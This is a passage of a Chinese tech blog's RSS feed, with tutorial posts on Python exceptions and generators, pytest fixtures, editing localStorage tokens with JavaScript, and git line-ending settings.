    &lt;span style=&#34;color:#66d9ef&#34;&gt;with&lt;/span&gt; pytest&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;raises(&lt;span style=&#34;color:#a6e22e&#34;&gt;ValueError&lt;/span&gt;, match&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;value not 0 or None&amp;#34;&lt;/span&gt;):
        exc(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;assert&lt;/span&gt; eval(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1 + 2&amp;#34;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;c注意&#34;&gt;c.注意&lt;/h3&gt;
&lt;p&gt;raise 的异常应该是当前代码块最后一行，如果在其后面还有代码，那么将不会被执行。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Python—yield 生成器的用法</title>
        <link>https://ac-lm.github.io/posts/python/pythonyield-%E7%94%9F%E6%88%90%E5%99%A8%E7%9A%84%E7%94%A8%E6%B3%95/</link>
        <pubDate>Sun, 17 Jan 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/python/pythonyield-%E7%94%9F%E6%88%90%E5%99%A8%E7%9A%84%E7%94%A8%E6%B3%95/</guid>
        <description>&lt;h2 id=&#34;1generator生成器&#34;&gt;1.generator（生成器）&lt;/h2&gt;
&lt;p&gt;带有 yield 的函数在 Python 中被称之为 generator（生成器），而不是一个函数，这个生成器带有一个next函数，在调用 next 时函数才会执行，执行到 yield 停止，下一次的 next 开始的地方是接着上一次的 next 停止的地方执行。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;foo&lt;/span&gt;():
    print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;starting...&amp;#34;&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;yield&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;
        res &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;yield&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;res:&amp;#34;&lt;/span&gt;,res)
g &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; foo()
print(next(g))
print(next(g))
print(next(g))
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2为什么需要-yield&#34;&gt;2.为什么需要 yield&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;1000&lt;/span&gt;): &lt;span style=&#34;color:#66d9ef&#34;&gt;pass&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这个循环在运行中占用的内存会随着 range() 的参数的增大而增大，range() 会生成一个List。如果要控制内存占用，最好不要用 List&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; xrange(&lt;span style=&#34;color:#ae81ff&#34;&gt;1000&lt;/span&gt;): &lt;span style=&#34;color:#66d9ef&#34;&gt;pass&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在python2中这样写则不会生成一个 1000 个元素的 List，而是在每次迭代中返回下一个数值，内存空间占用很小。因为 xrange 不返回 List，而是返回一个 iterable 对象。【iterable意思为迭代，可以理解为连续的一组数据，可以遍历的数据，包含内置的string、list、dict、tuple、set()】&lt;/p&gt;
&lt;p&gt;在 Python3 中则是 yield&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Pytest—fixture 实现 setup 和 teardown</title>
        <link>https://ac-lm.github.io/posts/pytest&#43;allure/pytestfixture-%E5%AE%9E%E7%8E%B0-setup-%E5%92%8C-teardown/</link>
        <pubDate>Sat, 16 Jan 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/pytest&#43;allure/pytestfixture-%E5%AE%9E%E7%8E%B0-setup-%E5%92%8C-teardown/</guid>
        <description>&lt;h2 id=&#34;1setup-与-fixture-的启动顺序&#34;&gt;1.setup 与 fixture 的启动顺序&lt;/h2&gt;
&lt;p&gt;fixture 的启动在 setup 之前，在 fixture 执行完之后执行 setup&lt;/p&gt;
&lt;h2 id=&#34;2setup-和-teardown-的实现&#34;&gt;2.setup 和 teardown 的实现&lt;/h2&gt;
&lt;p&gt;通过使用 yield 关键字实现teardown 操作&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;@pytest&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;fixture()
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;open&lt;/span&gt;():
    print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;打开浏览器，并且打开百度&amp;#34;&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;yield&lt;/span&gt;
    print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;执行teardown&amp;#34;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;如果其中一个用例出现异常，不影响 yield 后面的 teardown 执行，并且全部用例执行完之后，yield 呼唤 teardown 操作&lt;/li&gt;
&lt;li&gt;如果在 setup 就异常了，那么是不会去执行 yield 后面的 teardown 内容了&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>Python—Web LocalStorage 修改</title>
        <link>https://ac-lm.github.io/posts/python/pythonweb-localstorage-%E4%BF%AE%E6%94%B9/</link>
        <pubDate>Sat, 16 Jan 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/python/pythonweb-localstorage-%E4%BF%AE%E6%94%B9/</guid>
        <description>&lt;h2 id=&#34;1目标&#34;&gt;1.目标&lt;/h2&gt;
&lt;p&gt;修改 LocalStorage 和 SessionStorage 中的 token&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202205051036044.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202205051036044.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;2实现&#34;&gt;2.实现&lt;/h2&gt;
&lt;p&gt;使用 JavaScript 进行获取 token 和修改 token 的操作&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;设置localStorage&lt;/span&gt;
      &lt;span style=&#34;color:#a6e22e&#34;&gt;Storage&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;set&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;val&lt;/span&gt;) {
        &lt;span style=&#34;color:#a6e22e&#34;&gt;localStorage&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;setItem&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;val&lt;/span&gt;);
      }
&lt;span style=&#34;color:#ae81ff&#34;&gt;2.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;获取localStorage&lt;/span&gt;
      &lt;span style=&#34;color:#a6e22e&#34;&gt;Storage&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;get&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;) {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;localStorage&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;getItem&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;);
      }
&lt;span style=&#34;color:#ae81ff&#34;&gt;3.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;调用函数&lt;/span&gt;
      &lt;span style=&#34;color:#a6e22e&#34;&gt;Storage&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;set&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;status&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;OK&amp;#34;&lt;/span&gt;);
      &lt;span style=&#34;color:#a6e22e&#34;&gt;Storage&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;set&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;quit&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;...&amp;#34;&lt;/span&gt;);
      &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;Storage&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;get&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;status&amp;#34;&lt;/span&gt;));

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>BUG—git 提示 LF will be replaced by CRLF</title>
        <link>https://ac-lm.github.io/posts/bug/buggit-%E6%8F%90%E7%A4%BA-lf-will-be-replaced-by-crlf/</link>
        <pubDate>Fri, 15 Jan 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/bug/buggit-%E6%8F%90%E7%A4%BA-lf-will-be-replaced-by-crlf/</guid>
        <description>&lt;h2 id=&#34;bug-描述&#34;&gt;BUG 描述&lt;/h2&gt;
&lt;p&gt;在 windows 平台下使用 git add，git deploy 文件时经常出现&lt;code&gt;warning: LF will be replaced by CRLF&lt;/code&gt;的提示&lt;/p&gt;
&lt;h2 id=&#34;resolution&#34;&gt;Resolution&lt;/h2&gt;
&lt;p&gt;这是因为在文本处理中，CR（CarriageReturn）/ LF（LineFeed）是不同操作系统上使用的换行符，当我们在 Windows 上的编辑器打开文件时，编辑器会把行尾的换行（LF）字符转换成回车（CR）和换行（LF），或在用户按下 Enter 键时，插入回车（CR）和换行（LF）两个字符。&lt;/p&gt;
&lt;p&gt;在 Linux 下，命令 &lt;code&gt;unix2dos&lt;/code&gt; 可以把 Linux 文件格式转换成 Windows 文件格式，命令 &lt;code&gt;dos2unix&lt;/code&gt; 可以把 Windows 格式转换成 Linux 文件格式。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Dos 和 Windows 平台： 使用回车（CR）和换行（LF）两个字符来结束一行，回车+换行(CR+LF)，即（\r\n）&lt;/li&gt;
&lt;li&gt;Mac 和 Linux 平台：只使用换行（LF）一个字符来结束一行，即(\n)&lt;/li&gt;
&lt;li&gt;回车符就是回到一行的开头，用符号 r 表示，十进制 ASCII 代码是 13，十六进制代码为 0x0D&lt;/li&gt;
&lt;li&gt;换行符就是另起一行，用 n 符号表示，ASCII 代码是 10，十六制为 0x0A&lt;/li&gt;
&lt;li&gt;我们平时编写文件的回车符应该确切来说叫做回车换行符&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Git 可以在你提交时自动地把回车（CR）和换行（LF）转换成换行（LF），而在检出（检查出入）代码时把换行（LF）转换成回车（CR）和换行（LF）。如果是在 Windows 系统上，把它设置成 true，这样在检出代码时，换行会被转换成回车和换行。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 提交时转换为LF，检出时转换为CRLF&lt;/span&gt;
git config --global core.autocrlf true
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;如果使用以换行（LF）作为行结束符的 Linux 或 Mac，你不需要 Git 在检出文件时进行自动的转换。然而当一个以回车（CR）和换行（LF）作为行结束符的文件不小心被引入时，你肯定想让 Git 修正。 所以，你可以把 core.autocrlf 设置成 input 来告诉 Git 在提交时把回车和换行转换成换行，检出时不转换：（这样在 Windows 上的检出文件中会保留回车和换行，而在 Mac 和 Linux 上，以及版本库中会保留换行。）&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 提交时转换为LF，检出时不转换&lt;/span&gt;
git config --global core.autocrlf input
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;如果你是 Windows 程序员，且正在开发仅运行在 Windows 上的项目，可以设置 false 取消此功能，把回车保留在版本库中。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 提交检出均不转换&lt;/span&gt;
git config --global core.autocrlf false
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;你也可以在文件提交时进行safecrlf检查&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 拒绝提交包含混合换行符的文件&lt;/span&gt;
git config --global core.safecrlf true   

&lt;span style=&#34;color:#75715e&#34;&gt;# 允许提交包含混合换行符的文件&lt;/span&gt;
git config --global core.safecrlf false   

&lt;span style=&#34;color:#75715e&#34;&gt;# 提交包含混合换行符的文件时给出警告&lt;/span&gt;
git config --global core.safecrlf warn
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Pytest—fixture</title>
        <link>https://ac-lm.github.io/posts/pytest&#43;allure/pytestfixture/</link>
        <pubDate>Fri, 15 Jan 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/pytest&#43;allure/pytestfixture/</guid>
        <description>&lt;p&gt;fixture是pytest提供给测试环境初始化与清理的一个函数，通过语法糖@pytest.fixture()，测试用例会在测试开始前与测试结束后自动的执行@pytest.fixture()标记的函数，完成测试环境的初始化与清理。&lt;/p&gt;
&lt;h2 id=&#34;1fixture-的优势&#34;&gt;1.fixture 的优势&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;1.有独立的命名，并通过声明它们从测试函数、模块、类或整个项目中的使用来激活。&lt;/li&gt;
&lt;li&gt;2.按模块化的方式实现，每个fixture都可以互相调用。&lt;/li&gt;
&lt;li&gt;3.fixture的范围从简单的单元测试到复杂的功能测试，可以对fixture配置参数，或者跨函数function，类class，模块module或整个测试session范围。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;2fixture-当做参数传入&#34;&gt;2.fixture 当做参数传入&lt;/h2&gt;
&lt;p&gt;定义fixture跟定义普通函数差不多，唯一区别就是在函数上加个装饰器@pytest.fixture()，fixture命名不要以test开头，跟用例区分开。fixture是有返回值得，没有返回值默认为None。用例调用fixture的返回值，直接就是把fixture的函数名称当做变量名称。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;@pytest&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;fixture()
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;K&lt;/span&gt;():
    a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;leo&amp;#39;&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; a
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;test2&lt;/span&gt;(K):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;assert&lt;/span&gt; test1 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;leo&amp;#39;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;3使用多个-fixture&#34;&gt;3.使用多个 fixture&lt;/h2&gt;
&lt;p&gt;如果用例需要用到多个fixture的返回数据，fixture也可以返回一个元祖，list或字典，然后从里面取出对应数据。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;@pytest&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;fixture()
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;test1&lt;/span&gt;():
    a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;leo&amp;#39;&lt;/span&gt;
    b &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;123456&amp;#39;&lt;/span&gt;
    print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;传出a,b&amp;#39;&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; (a, b)

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;test2&lt;/span&gt;(test1):
    u &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; test1[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]
    p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; test1[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]
    &lt;span style=&#34;color:#66d9ef&#34;&gt;assert&lt;/span&gt; u &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;leo&amp;#39;&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;assert&lt;/span&gt; p &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;123456&amp;#39;&lt;/span&gt;
    print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;元祖形式正确&amp;#39;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;4fixture-的作用范围&#34;&gt;4.fixture 的作用范围&lt;/h2&gt;
&lt;p&gt;fixture里面有个scope参数可以控制fixture的作用范围：session&amp;gt;module&amp;gt;class&amp;gt;function&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;function：每一个函数或方法都会调用&lt;/li&gt;
&lt;li&gt;class：每一个类调用一次，一个类中可以有多个方法&lt;/li&gt;
&lt;li&gt;module：每一个.py文件调用一次，该文件内又有多个function和class&lt;/li&gt;
&lt;li&gt;session：是多个文件调用一次，可以跨.py文件调用，每个.py文件就是module&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;5fixture-的参数&#34;&gt;5.fixture 的参数&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;fixture&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;（&lt;/span&gt;scope&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;function&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;，&lt;/span&gt;params&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;，&lt;/span&gt;autouse&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;，&lt;/span&gt;ids&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;，&lt;/span&gt;name&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;）&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;scope：有四个级别参数&amp;quot;function&amp;quot;（默认），&amp;ldquo;class&amp;rdquo;，&amp;ldquo;module&amp;rdquo;，&amp;ldquo;session&amp;rdquo;&lt;/li&gt;
&lt;li&gt;params：一个可选的参数列表。&lt;/li&gt;
&lt;li&gt;autouse：如果True，则为所有测试都可以自动使用 fixture 函数。如果为False则显示需要传参来激活fixture&lt;/li&gt;
&lt;li&gt;ids：每个字符串id的列表，每个字符串对应于params这样他们就是测试ID的一部分。如果没有提供ID它们将从params自动生成&lt;/li&gt;
&lt;li&gt;name：fixture的名称。这默认为装饰函数的名称。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;6调用-fixture-的三种方法&#34;&gt;6.调用 fixture 的三种方法&lt;/h2&gt;
&lt;h3 id=&#34;1函数或类里面方法直接传-fixture-的函数参数名称&#34;&gt;1.函数或类里面方法直接传 fixture 的函数参数名称&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;@pytest&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;fixture()
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;test1&lt;/span&gt;():
    print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;开始执行function&amp;#39;&lt;/span&gt;)

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;test_a&lt;/span&gt;(test1):
    print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;---用例a执行---&amp;#39;&lt;/span&gt;)

&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;TestCase&lt;/span&gt;:
    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;test_b&lt;/span&gt;(self, test1):
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;---用例b执行&amp;#39;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;2使用装饰器-pytestmarkusefixtures-修饰需要运行的用例&#34;&gt;2.使用装饰器 @pytest.mark.usefixtures() 修饰需要运行的用例&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;@pytest&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;fixture()
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;test1&lt;/span&gt;():
    print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;开始执行function&amp;#39;&lt;/span&gt;)

&lt;span style=&#34;color:#a6e22e&#34;&gt;@pytest&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;mark&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;usefixtures(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;test1&amp;#39;&lt;/span&gt;)
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;test_a&lt;/span&gt;():
    print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;---用例a执行---&amp;#39;&lt;/span&gt;)

&lt;span style=&#34;color:#a6e22e&#34;&gt;@pytest&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;mark&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;usefixtures(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;test1&amp;#39;&lt;/span&gt;)
&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;TestCase&lt;/span&gt;:
